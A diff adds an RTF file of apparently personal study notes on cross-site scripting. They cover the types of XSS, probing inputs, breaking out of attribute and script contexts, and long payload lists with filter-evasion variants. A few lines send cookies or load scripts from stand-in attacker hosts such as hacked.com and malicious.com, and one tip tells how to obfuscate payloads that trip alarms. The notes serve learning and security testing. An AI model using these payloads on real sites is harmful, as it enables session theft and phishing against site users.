@@ -1,0 +1,487 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\froman\fcharset0 Times-Roman;\f2\fmodern\fcharset0 Courier;
+\f3\fmodern\fcharset0 Courier-Bold;}
+{\colortbl;\red255\green255\blue255;\red52\green52\blue52;\red9\green47\blue157;\red28\green28\blue28;
+\red252\green24\blue39;\red15\green112\blue1;\red0\green0\blue255;\red30\green46\blue58;\red0\green0\blue233;
+\red255\green0\blue0;}
+{\*\listtable{\list\listtemplateid1\listhybrid{\listlevel\levelnfc0\levelnfcn0\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{decimal\}.}{\leveltext\leveltemplateid1\'02\'00.;}{\levelnumbers\'01;}\fi-360\li720\lin720 }{\listname ;}\listid1}
+{\list\listtemplateid2\listhybrid{\listlevel\levelnfc0\levelnfcn0\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{decimal\}.}{\leveltext\leveltemplateid101\'02\'00.;}{\levelnumbers\'01;}\fi-360\li720\lin720 }{\listname ;}\listid2}
+{\list\listtemplateid3\listhybrid{\listlevel\levelnfc0\levelnfcn0\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{decimal\}.}{\leveltext\leveltemplateid201\'02\'00.;}{\levelnumbers\'01;}\fi-360\li720\lin720 }{\listname ;}\listid3}
+{\list\listtemplateid4\listhybrid{\listlevel\levelnfc0\levelnfcn0\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{decimal\}.}{\leveltext\leveltemplateid301\'02\'00.;}{\levelnumbers\'01;}\fi-360\li720\lin720 }{\listname ;}\listid4}
+{\list\listtemplateid5\listhybrid{\listlevel\levelnfc0\levelnfcn0\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{decimal\}.}{\leveltext\leveltemplateid401\'02\'00.;}{\levelnumbers\'01;}\fi-360\li720\lin720 }{\listname ;}\listid5}
+{\list\listtemplateid6\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{disc\}}{\leveltext\leveltemplateid501\'01\uc0\u8226 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listname ;}\listid6}}
+{\*\listoverridetable{\listoverride\listid1\listoverridecount0\ls1}{\listoverride\listid2\listoverridecount0\ls2}{\listoverride\listid3\listoverridecount0\ls3}{\listoverride\listid4\listoverridecount0\ls4}{\listoverride\listid5\listoverridecount0\ls5}{\listoverride\listid6\listoverridecount0\ls6}}
+\paperw11900\paperh16840\margl1440\margr1440\vieww20260\viewh11400\viewkind0
+\deftab720
+\pard\pardeftab720\partightenfactor0
+
+\f0\b\fs40 \cf2 \expnd0\expndtw0\kerning0
+Cross-site scripting
+\b0  (XSS) is both the name of the most common vulnerability in web applications and the exploitation method performed against it. XSS attacks abuse the dynamic way websites interact with their clients, the browsers. It makes possible, for an attacker, to control the victim's browser and his/her interaction with a given vulnerable website. To display back content provided or controlled by an user, like an URL parameter or an input field, a flawed application opens the door to manipulation of this content. This manipulation, generically called injection, is the 
+\b XSS attack
+\b0 .
+\fs24 \cf0 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \
+
+\b\fs28 \ul References
+\b0 \ulnone \
+\
+1. http://brutelogic.com.br/blog/xss101/
+\fs24 \
+\
+\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+
+\fs32 \cf0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97
+\fs24 \
+\pard\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "https://www.owasp.org/index.php/XSS"}}{\fldrslt 
+\fs32 \cf3 \expnd0\expndtw0\kerning0
+XSS}}
+\fs32 \cf4 \expnd0\expndtw0\kerning0
+ attacks are essentially code injection attacks into the various interpreters in the browser. \
+These attacks can be carried out using HTML, JavaScript, VBScript, ActiveX, Flash, and other client-side languages. \
+These attacks also have the ability to gather data from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. \
+In some cases, Cross Site Scripting vulnerabilities can perform other functions such as scanning for other vulnerabilities and performing a Denial of Service on your web server.\
+\
+\pard\pardeftab720\partightenfactor0
+
+\b \cf4 \ul \ulc4 WATCH OUT HOW THE \'93 CLOSE AND TRY TO TRICK THE SYSTEM \cf0 \kerning1\expnd0\expndtw0 \ulc0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+
+\b0 \cf0 \ulnone \
+We have many different types of XSS\
+	1. Stored XSS\
+	2. Reflected XSS\
+	3. DOM XSS\
+\
+
+\b \ul WHERE
+\b0 \ulnone   \'97 Where do you use XSS?\
+\
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+To find XSS flaws we need to know where to look for it and how we can detect it. \
+Where to look for it is as simple as complicated: \
+	
+\b all we need is to probe every input the application has.\
+\pard\pardeftab720\partightenfactor0
+
+\b0 \cf0 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 You use XSS in:\
+	1. Search Engines\
+	2. Online message boards\
+	3. Contact page\
+	4. Web logs\
+	5. Guestbook\
+	6. User forums\
+	7. Parameters\
+	8. Login - Forgot forms\
+	9. URI\
+	10. Customizable Themes & Profiles via CSS\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\b \ul PROCESS
+\b0 \ulnone \
+\pard\pardeftab720\partightenfactor0
+
+\fs40 \cf2 \expnd0\expndtw0\kerning0
+\
+
+\fs32 We will do it using a probe string, a set of characters that we can look for it in source code in order to know if we can go further to inject a payload.\
+\
+Which is the most important single character for a XSS payload? \
+As we are dealing with HTML, the most important is the identifier of a tag: the less than sign \'93<\'94.\
+\
+Although there are injections which don\'92t need it, like an injection inside a tag without breaking it or one into the javascript section of the code, the tag based payloads work on all situations.\
+\
+If we inject a \'93<\'94 sign into any application input and we see it in the response of the web server, there\'92s a great chance to inject a payload. But it will be hard to spot only that char in source code (it\'92s everywhere), so we need something to help us to identify it. So we will use just another char after it:   <1\cf0 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \
+Example\
+\
+\pard\pardeftab720\partightenfactor0
+
+\b \cf2 \expnd0\expndtw0\kerning0
+Probe
+\b0  \'97> http://domain/page?param1=
+\b 1<1
+\b0 &param2=
+\b 2<1
+\b0 \
+
+\b Source code
+\b0  \'97> <input type=\'93text\'94 value=\'93
+\b \cf5 2<1
+\b0 \cf2 \'94>\
+\
+We can quickly move to a full working payload like:\
+\
+
+\b Injection
+\b0  \'97> http://domain/page?param1=1&param2=
+\b \'94><svg+onload=\'93alert(1)
+\b0 \
+
+\b Source code
+\b0  \'97> <input type=\'93text\'94 value=\'93\cf5 \'94>
+\b <svg onload=
+\b0 \'93
+\b alert(1)
+\b0 \cf2 \'94>
+\fs40 \
+\pard\pardeftab720\partightenfactor0
+
+\fs32 \cf0 \kerning1\expnd0\expndtw0 \
+\pard\pardeftab720\partightenfactor0
+\cf0 \expnd0\expndtw0\kerning0
+As you can see, even though the script tags originated from user input and were supposed to be interpreted as simple text,\
+as they contained those important < and > characters, the web browser has interpreted them as \cf6 code\cf0  and not \cf7 text\cf0 ! \
+This means that code has sneaked its way in from the URL in the case into the body of the page as the site did not protect against this vulnerability.\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \kerning1\expnd0\expndtw0 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\pardeftab720\partightenfactor0
+
+\b \cf0 \ul BASIC APPROACH\
+\pard\pardeftab720\partightenfactor0
+
+\b0 \cf0 \ulnone \
+\pard\pardeftab720\partightenfactor0
+
+\fs28 \cf0 1) Use an arbitrary string that does not appear anywhere within the App and contains only alphanumerical chars.\
+\
+	e.x. myxsstestdmplwp\
+\
+Check the result is it \'91myxsstestdmplwp\'92 OR \'93myxsstestdmplwp\'94\
+\
+2) Monitor the App responses for the appearance of the same string and note the params whose value is being copied in the App response.\
+3) GET/POST requests need training\
+\
+
+\b \ul COMMANDS TO CHECK:\
+
+\b0 \ulnone \
+\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
+\ls1\ilvl0\cf0 {\listtext	1.	}Exploit \'93 so : 
+\b \'93><script>alert(1)</script>
+\b0    in <input type=\'93text\'94 name=\'93address1\'94 value=\'93myxsstestdmplwp\'94>\
+{\listtext	2.	}Exploit \'91 so  : 
+\b \'92><script>alert(1)</script>
+\b0    \
+{\listtext	3.	}Exploit : 
+\b \'91; alert(1); var foo=\'91
+\b0    in  <script> var a=\'91myxsstestdmplwp\'92; var b=123; \'85 </script>\
+{\listtext	4.	}Exploit a <a> tag : 
+\b javascript:alert(1);
+\b0  OR 
+\b #\'94onclick=\'93javascript:alert(1)    
+\b0 in <a href=\'93myxsstestdmplwp\'94>Click here\'85</a>\
+\pard\pardeftab720\partightenfactor0
+
+\fs32 \cf0 \
+In case you got an error try to identify which part of the script raised the alarm in order to obfuscate it to avid raising the alarm.\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\pard\pardeftab720\partightenfactor0
+
+\b\fs48 \cf8 \expnd0\expndtw0\kerning0
+XSS Basic Examples\
+
+\fs60 \
+\pard\pardeftab720\partightenfactor0
+
+\b0\fs40 \cf2 Usually, for a proof of concept (PoC) of an XSS attack exploring source-based flaws, security testers use one the following code.\
+\
+\pard\pardeftab720\partightenfactor0
+
+\b \cf2 1. With <script> tag\
+\pard\pardeftab720\partightenfactor0
+
+\b0 \cf2 \
+	<script>alert(1)</script>\
+or\
+	<script src=//\cf7 HOST\cf2 /\cf7 SCRIPT\cf2 ></script>\
+\
+\pard\pardeftab720\partightenfactor0
+
+\fs28 \cf2 With \cf7 HOST\cf2  being a domain or IP address controlled by tester and \cf7 SCRIPT\cf2  being a script with alert(1) as content, like in:
+\fs40 \
+\
+	<script src=//14.rs></script>\
+\
+\pard\pardeftab720\partightenfactor0
+
+\b \cf2 2. With regular HTML tags\
+\pard\pardeftab720\partightenfactor0
+
+\b0 \cf2 \
+	2.1 Event-based\
+\
+		<\cf7 TAG\cf2  \cf7 EVENT\cf2 =alert(1)>   
+\fs28 With \cf7 TAG\cf2  being any HTML or XML tag and \cf7 EVENT\cf2  being a supported event handler like:
+\fs40 \
+		\
+		<body onload=alert(1)>\
+		<img src=1 onerror=alert(1)>\
+		<svg onload=alert(1)>\
+		<x onmouseover=alert(1)>\
+\
+	2.2 Resource-based\
+\
+		<\cf7 TAG\cf2  \cf7 RESOURCE\cf2 =javascript:alert(1)>   
+\fs28 With \cf7 TAG\cf2  being a proper HTML tag that supports a \cf7 RESOURCE\cf2  like:\
+
+\fs40 \
+		<iframe src=javascript:alert(1)>\
+		<object data=javascript:alert(1)>\
+\
+All these make a window pop-up appears with the number one inside. Although useful to show the executing of javascript and then the possibility of hooking the browser for control, it's better to prove that execution in the 
+\b context of the application
+\b0 . For this, \'93alert(1)\'94 is changed to \'93alert(document.domain)\'94.\
+\
+Example:\
+	<script>alert(document.domain)</script>\
+\
+These are just to prove the vulnerability; for attacks in the wild, a victim of an XSS attack usually will not be able to see anything while his/her browser will perform the attacker's desired actions.
+\fs32 \cf0 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\pard\pardeftab720\partightenfactor0
+
+\b \cf0 \ul PROBING DEFENSIVE FILTERS\
+\pard\pardeftab720\partightenfactor0
+
+\b0 \cf0 \ulnone \
+\pard\pardeftab720\partightenfactor0
+
+\b \cf0 \ul Avoid Filters
+\b0 \ulnone \
+\
+\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
+\ls2\ilvl0\cf0 {\listtext	      1.	}\'93><script >alert(document.cookie)</script >\
+\pard\pardeftab720\partightenfactor0
+\ls2\ilvl0\cf0 {\listtext	2.	}\'93><ScRiPt>alert(document.cookie)</ScRiPt>\
+{\listtext	3.	}\'93%3e%3cscript%3ealert(document.cookie)%3c/script%3e\
+{\listtext	4.	}\'93><scr<script>ipt>alert(document.cookie)</scr</script>ipt>\
+{\listtext	5.	}%00\'93><script>alert(document.cookie)</script>\
+\pard\pardeftab720\partightenfactor0
+\cf0 \
+\pard\pardeftab720\partightenfactor0
+
+\b \cf0 \ul Script Tags
+\b0 \ulnone \
+\
+\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
+\ls3\ilvl0\cf0 {\listtext	1.	}<object data=\'93data:text/html,<script>alert(1)</script>\'94>\
+{\listtext	2.	}<object data=\'93data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\'94>\
+{\listtext	3.	}<a href=\'94data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\'94>Click here</a>\
+\pard\pardeftab720\partightenfactor0
+\cf0 \
+\pard\pardeftab720\partightenfactor0
+
+\b \cf0 \ul Event Handlers
+\b0 \ulnone \
+\
+\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
+\ls4\ilvl0\cf0 {\listtext	1.	} <xml onreadystatechange=alert(1)>\
+{\listtext	2.	} <style onreadystatechange=alert(1)>\
+\pard\pardeftab720\partightenfactor0
+\ls4\ilvl0\cf0 {\listtext	3.	}<iframe onreadystatechange=alert(1)>\
+{\listtext	4.	}<object onerror=alert(1)>\
+{\listtext	5.	}<object type=image src=valid.gif onreadystatechange=alert(1)></object>\
+{\listtext	6.	}<img type=image src=valid.gif onreadystatechange=alert(1)>\
+{\listtext	7.	}<input type=image src=valid.gif onreadystatechange=alert(1)>\
+{\listtext	8.	}<isindex type=image src=valid.gif onreadystatechange=alert(1)>\
+{\listtext	9.	}<script onreadystatechange=alert(1)>\
+{\listtext	10.	}<bgsound onpropertychange=alert(1)>\
+{\listtext	11.	}<body onbeforeactivate=alert(1)>\
+{\listtext	12.	}<body onactivate=alert(1)>\
+{\listtext	13.	}<body onfocusin=alert(1)>\
+{\listtext	14.	}12\'94 onemouseover=\'93alert(1);\
+{\listtext	15.	}``onmouseover=alert(document.domain);\
+\pard\pardeftab720\partightenfactor0
+\cf0 \
+   \ul HTML5\ulnone \
+\
+\pard\tx220\tx720\tx1133\tx1700\pardeftab720\li720\fi-720\partightenfactor0
+\ls5\ilvl0\cf0 {\listtext	      1.	}    <input autofocus onfocus=alert(1)>\
+\pard\pardeftab720\partightenfactor0
+\ls5\ilvl0\cf0 {\listtext	2.	}<input onblur=alert(1) autofocus><input autofocus>\
+{\listtext	3.	}<body onscroll=alert(1)><br><br>...<br><input autofocus>\
+{\listtext	4.	}<video src=1 onerror=alert(1)>\
+{\listtext	5.	}<audio src=1 onerror=alert(1)>\
+{\listtext	6.	}</a onmousemove=alert(1)>\
+\pard\pardeftab720\partightenfactor0
+\cf0 \
+\pard\pardeftab720\partightenfactor0
+
+\b \cf0 \ul Script Pseudo-Protocols
+\b0 \ulnone \
+\
+Script pseudo-protocols can be used in various locations to execute inline script within an attribute that expects a URL.\
+\
+1. <object data=javascript:alert(1)>\
+2. <iframe src=javascript:alert(1)>\
+3. <embed src=javascript:alert(1)>\
+4. <form id=test /><button form=test formaction=javascript:alert(1)>\
+5. <event-source src=javascript:alert(1)>\
+\
+
+\b \ul Dynamically Evaluated Styles
+\b0 \ulnone \
+\
+Some browsers support the use of JavaScript within dynamically evaluated\
+CSS styles. The following example works on IE7 and earlier, and also on later\
+versions when running in compatibility mode:\
+\
+	<x style=x:expression(alert(1))>\
+\
+Later versions of IE removed support for the preceding syntax, on the basis\
+that its only usage in practice was in XSS attacks. However, on later versions of\
+IE, the following can be used to the same effect:\
+\
+	<x style=behavior:url(#default#time2) onbegin=alert(1)>\
+\
+
+\b \ul EXTRA
+\b0 \ulnone \
+\
+"><img src=x onerror=prompt(1);>\
+<--`<img/src=` onerror=alert(1)> --!>\
+<--`<img/src=` onerror=alert(1)> --!>
+\b \
+\pard\pardeftab720\partightenfactor0
+
+\b0 \cf0 \
+\
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f1 \cf0 \expnd0\expndtw0\kerning0
+All modern browsers have a global function galled 
+\f2 atob()
+\f1  to decode Base64 strings,\
+\
+ To execute a string as JavaScript, use {\field{\*\fldinst{HYPERLINK "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval"}}{\fldrslt \cf9 \ul \ulc9 eval()}}
+\fs28 .\
+\
+
+\f3\b 	"><script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));</script>\
+
+\f0\b0\fs32 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\pardeftab720\partightenfactor0
+\cf0 \
+\
+\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\pardeftab720\partightenfactor0
+\cf0 \
+\
+\
+\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+
+\b \cf0 SO FOCUS ON <input>,values\
+	\
+	<input type=\'93text\'94 value=\'93 \'93onmouseover=\'93alert(1)\'94>\
+\
+	<img src=\'91a.png\'92 onerror=\'91alert(1)\'92>\
+\
+(SVG Image) \
+\
+<defs>\
+	<path id=\'93example..\'94 d=\'93..\'94>\
+</defs>\
+<use xlink:href=\'93#example\'94 visibility=\'93hidden\'94>\
+		<set begin=\'930s\'94 end=\'931s\'94 attributeName=\'93visibility\'94 to=\'93visible\'94>\
+</use>\
+\
+If we replace:\
+\
+<use xlink:href=\'93#example\'94 visibility=\'93hidden\'94>\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf10 		<set begin=\'93accessKey(a)\'94 end=\'931s\'94 attributeName=\'93xlink:href\'94 to=\'93//evil.c/?a\'94>\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 </use>\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+
+\b0 \cf0 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\b \ul Javascript Parameters\
+
+\b0 \ulnone \
+alert()  \'97 throw a pop up screen to display information\
+\
+document.cookie()  \'97 Show the session cookie\
+\
+document.write(\'91bla bla\'92)  \'97 Write something in the web page (page body)\
+	<script>document.write(\'91<script src=http:/attack.com/xss.js></script>\'92)</script>\
+\
+document.domain		\'97 Find the domain\
+\
+document.location		\'97 Shows url\
+\
+onmouseover = alert(1)  \'97 If the mouse is over the specific tag throw alert (HTML tag)\
+\
+javascript:alert(1) \'97 HREF Attribute\
+\
+window.localStorage\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\b \ul STORED XSS - ATTACKS\
+
+\b0 \ulnone \
+<script>alert(\'91Something Doggy is going on\'92)</script>\
+\
+<script>alert(document.cookie)</script>\
+\
+<script>alert(document.getElementById(\'91blabla\'92).innerHTML)</script>\
+\
+<script>window.location = \'93http://www.hacked.com/?cookie=\'93 + document.cookie</script>\
+\
+<script type=\'93text/javascript\'94>alert(1);</script>\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\b \ul Phishing Attack
+\b0 \ulnone \
+\
+Create a link like:\
+\
+<script src=\'93http://www.malicious.com/phishing.js\'94></script>\
+\
+Then check the phishing.js file\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
+\ls6\ilvl0\cf0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+}
